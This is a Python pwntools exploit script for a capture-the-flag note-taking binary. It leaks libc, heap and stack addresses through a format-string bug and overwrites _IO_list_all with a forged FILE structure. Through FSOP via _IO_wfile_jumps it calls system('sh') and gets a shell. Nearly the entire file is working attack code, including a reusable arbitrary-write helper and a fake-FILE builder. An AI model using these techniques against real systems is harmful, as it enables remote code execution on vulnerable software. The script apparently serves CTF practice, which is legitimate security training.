#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF("./libc-2.31.so", checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'takenote.kctf-453514-codelab.kctf.cloud', 1337

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    # b *strncpy+88
    # b *puts+332
    b *system
    b *_IO_wdoallocbuf
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/chroot/home/user/chal"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='chal')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      No RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     Stripped:   No

# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp


def onegadget():
    output = process(["one_gadget", "-r", libc.path]).recvline().decode().strip().split(" ")
    return [int(addr) for addr in output]

def write(idx, value, newline=True):
    io.sendlineafter("3. Exit\n", "1")
    io.recvline()
    io.sendline(str(idx).encode())
    io.sendline(value)

def read(idx):
    io.sendlineafter("3. Exit\n", "2")
    io.recvline()
    io.sendline(str(idx).encode())
    io.recvuntil("Your note reads:\n\n")

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0):
    fs = FileStructure()   
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp 
    fs._lock = fp+0x100 
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset   
    return bytes(fs)


def www(where, what):
    offset = 12
    for i in range(len(what)):
        writes = {where + i:what[i]}
        input = fmtstr_payload(offset, writes, write_size='byte')
        write(80, input)
        read(80)

def exploit():
    global io
    one_gadget = onegadget()
    # https://niftic.ca/posts/fsop/#_io_wdoallocbuf43
    io = initialize()
    with log.progress("Leaking addresses"), context.silent:
        io.sendafter("How many notes do you need to write?\n", "99")
        write(0, b"%p%14$p%15$p%9$p")
        read(0)
        leak = io.recvline().strip().split(b"0x")
        libc_leak = int(leak[1], 16)
        libc.address = libc_leak - (libc.sym["_IO_2_1_stdout_"]+131)
        elf.address = int(leak[2], 16) - elf.sym["__libc_csu_init"]
        stack = int(leak[3], 16)
        ret = stack - 0x458
        heap = int(leak[4], 16)
        tls = libc.address + 0x1f3540
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    log.info("Elf base: %#x", elf.address)
    log.info("Stack address: %#x", stack)
    log.info("Return address: %#x", ret)
    log.info("Heap: %#x", heap)
    log.info("TLS: %#x", tls)
    payload = fsrop(heap)
    fake_fp = heap
    with log.progress("Making fake fp"), context.silent:
        www(libc.sym["_IO_list_all"], p64(heap))

        for i in range(len(payload)//0x10):
            write(i, payload[:0x10])
            www(heap+0x8, payload[0x8:0x10])
            payload = payload[0x10:]
            heap = heap + 0x10
        www(fake_fp + 208, p64(fake_fp + 0x60))
        www(fake_fp + 216, p64(libc.sym._IO_wfile_jumps))

    # Via GOT overwrite
    # www(elf.got["exit"], p64(libc.address + one_gadget[1]))
    io.sendlineafter("3. Exit\n", "3")
    io.interactive()

if __name__ == '__main__':
    exploit()
